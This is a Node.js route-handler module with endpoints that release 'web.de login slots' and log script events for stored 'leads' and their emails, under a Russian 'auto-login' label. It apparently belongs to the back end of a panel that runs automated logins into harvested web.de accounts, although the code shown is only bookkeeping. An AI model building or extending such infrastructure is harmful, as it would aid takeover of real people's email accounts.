const { send } = require('../../utils/httpUtils');
const { checkWorkerSecret } = require('../../utils/authUtils');

async function handle(scope) {
  with (scope) {
    if (pathname === '/api/webde-login-slot-done' && req.method === 'POST') {
      if (!checkWorkerSecret(req, res)) return true;
      let body = '';
      req.on('data', (chunk) => { body += chunk; });
      req.on('end', () => {
        let json = {};
        try { json = JSON.parse(body || '{}'); } catch {}
        const idRaw = json.id != null ? String(json.id).trim() : '';
        if (!idRaw) {
          return send(res, 400, { ok: false, error: 'id required' });
        }
        const idResolved = resolveLeadId(idRaw);
        webdeLoginChildByLeadId.delete(idResolved);
        releaseWebdeLoginSlot(idResolved);
        try {
          const leadsSlot = readLeads();
          const li = leadsSlot.findIndex(function (l) { return l.id === idResolved; });
          if (li !== -1) {
            endWebdeAutoLoginRun(leadsSlot[li]);
            const Ls = leadsSlot[li];
            persistLeadPatch(idResolved, {
              webdeScriptActiveRun: Ls.webdeScriptActiveRun,
              eventTerminal: Ls.eventTerminal
            });
          }
        } catch (e) {}
        return send(res, 200, { ok: true });
      });
      return true;
    }

    if (pathname === '/api/script-event' && req.method === 'POST') {
      if (!checkWorkerSecret(req, res)) return true;
      let body = '';
      req.on('data', (chunk) => { body += chunk; });
      req.on('end', () => {
        let json = {};
        try { json = JSON.parse(body || '{}'); } catch {}
        const idRaw = json.id != null ? String(json.id).trim() : '';
        const labelRaw = json.label != null ? String(json.label).trim() : '';
        if (!idRaw || !labelRaw) {
          return send(res, 400, { ok: false, error: 'id and label required' });
        }
        const label = labelRaw.slice(0, 180);
        const id = resolveLeadId(idRaw);
        const leads = readLeads();
        const idx = leads.findIndex((l) => l.id === id);
        if (idx === -1) return send(res, 404, { ok: false });
        const lead = leads[idx];
        lead.lastSeenAt = new Date().toISOString();
        const resSessionMeta = lead.webdeScriptActiveRun != null
          ? { session: lead.webdeScriptActiveRun }
          : (parseInt(lead.webdeScriptRunSeq, 10) > 0 ? { session: lead.webdeScriptRunSeq } : undefined);
        pushEvent(lead, label, 'script', resSessionMeta);
        logTerminalFlow(
          'SCRIPT',
          'Автовход',
          resSessionMeta && resSessionMeta.session != null ? String(resSessionMeta.session) : '—',
          (lead.emailKl || lead.email || '').trim() || '—',
          label,
          id
        );
        persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
        return send(res, 200, { ok: true });
      });
      return true;
    }

    return false;
  }
}

module.exports = { handle };
